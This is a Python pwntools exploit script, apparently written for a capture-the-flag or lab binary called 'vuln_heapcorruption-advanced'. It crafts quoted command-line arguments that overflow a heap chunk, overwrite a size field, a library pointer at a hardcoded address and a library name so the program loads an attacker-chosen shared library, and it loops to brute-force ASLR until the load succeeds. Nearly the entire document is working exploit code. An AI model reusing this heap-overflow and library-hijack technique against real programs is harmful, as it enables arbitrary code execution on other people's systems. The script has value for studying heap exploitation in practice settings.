#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
exe = context.binary = ELF('vuln_heapcorruption-advanced')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        # somehow gdb.debug automatically filters strings like "'foo'" to "foo"
        # but process keeps it
        argv = [arg.replace("'", "") if isinstance(
            arg, str) else arg for arg in argv]
        return process([exe.path] + argv, *a, **kw)


gdbscript = """
break main
continue
break 107
break 120
continue
""".format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# offsets to the ni heap chunk
# only used as information, where which variable is stored
# not used in the code
# not complete
OFFSET = {
    'NI_CHUNK': 0,
    'NI_SIZE': 4,
    'NI_LIB_POINTER': 32,
    'NI_NAME': 40,
    'LIB_CHUNK': 48,
    'LIB_SIZE': 48+4,
    'LIB_NAME': 48+8,
    'LIB_HANDLE': 48+12,
}

"""desired overflow contents:
set NI_SIZE = 0x00000031
set NI_LIB_POINTER = SOMEWHERE-4
set SOMWHERE = '\x00\x00\x00\x00' <- I've chosen ni.actions[1] for this
set NI_NAME = 'X/X\x00'
set LIB_SIZE = 0x00000011
"""

# depends on input size
# OFFFSET_USER_ARGS = user_args chunk size - 9 (see heap; something like 0x81)
OFFFSET_USER_ARGS = -120

# \ aaa
# results in
# \x00 + aaa + ' ' + aaa + ' '
# OFFFSET_USER_ARGS = 2*a + 3
random_chars_n = (abs(OFFFSET_USER_ARGS)-3)/2
USER_ARGS_PADDING = ["'\\'", cyclic(int(random_chars_n))]
# add one char (' ') if we would need 0.5 A's (ie an odd number of outputted A's)
if random_chars_n % 1 != 0:
    USER_ARGS_PADDING += ["''"]

argv = USER_ARGS_PADDING

# set NI_SIZE = 0x00000031
argv += [cyclic(3), "'" + chr(0x31) + "\\'", "'\\'", "'\\'", "''", "''"]
# 12 = len('\x31\x00\x00\x00 \x00\x00 \x00   ') (three spaces at the end)
# cur_offset: 16

# add NULL pointer
argv += ["'\\'", "'\\'", "'\\'", "'\\'", "''", "''"]
# 16 = len('\x00\x00\x00\x00 \x00\x00\x00 \x00\x00 \x00   ') (three spaces at the end)
# cur_offset: 32

# set NI_LIB_POINTER = SOMEWHERE-4 (ni.actions)
argv += [p32(0x5655a1e4)]
argv += [cyclic(2)]
# cur_offset: 40

# set NI_NAME = 'X/X\x00'
argv += ["'X/X\\'", "''", "''", "''"]
# cur_offset: 48

# set LIB_SIZE = 0x00000011
argv += [cyclic(3), "'" + chr(0x11) + "\\'", "'\\'", "'\\'", "''", "''"]
# cur_offset: 60


def log_():
    while True:
        try:
            log.info(io.recvlineS())
        except EOFError:
            break


def success_():
    success = b'Shared library loaded'
    try:
        io.recvuntil(success)
    except EOFError:
        return False
    io.unrecv(success)
    return True


with log.progress('Brute-forceing ASLR') as p:
    i = 0
    while True:
        i += 1
        io = start(argv, level=logging.ERROR)
        p.status(f'{i} attempts')
        if success_():
            p.success(f'Done ({i} attempts)')
            log_()
            break
        io.kill()
